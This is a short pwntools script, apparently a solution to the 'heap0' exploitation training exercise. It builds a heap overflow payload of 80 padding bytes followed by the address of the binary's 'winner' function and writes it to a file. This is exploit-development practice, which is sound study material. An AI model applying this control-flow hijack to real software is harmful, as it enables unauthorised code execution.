from pwn import *


elf = context.binary = ELF(f"./heap0")


payload = flat(
    b"A" * 80,
    elf.sym["winner"]
)

open("x.bin","wb").write(payload)